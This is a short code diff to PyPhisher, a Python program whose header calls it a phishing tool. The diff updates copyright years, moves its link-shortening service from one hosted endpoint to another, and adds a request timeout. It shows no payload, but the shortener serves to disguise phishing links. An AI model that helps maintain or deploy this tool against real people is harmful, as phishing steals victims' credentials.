@@ -3,7 +3,7 @@
 # Author     : KasRoudra
 # Version    : 2.1
 # License    : MIT
-# Copyright  : KasRoudra (2021-2023)
+# Copyright  : KasRoudra (2021-2024)
 # Github     : https://github.com/KasRoudra
 # Contact    : https://t.me/KasRoudra
 # Description: PyPhisher is a phishing tool in python
@@ -18,7 +18,7 @@
 """
 MIT License
 
-Copyright (c) 2021-2023 KasRoudra
+Copyright (c) 2021-2024 KasRoudra
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -880,10 +880,10 @@ def kshrten(url):
         if key in url:
             route = route_map[key]
             subdomain = url.replace("https://", "").replace(key, "")
-    website = f"https://kshrt2.vercel.app/{route}/{subdomain}"
+    website = f"https://kshrt.onrender.com/{route}/{subdomain}"
     internet()
     try:
-        res = post(website).text
+        res = post(website, timeout=30).text
     except Exception as e:
         append(e, error_file)
         res = ""
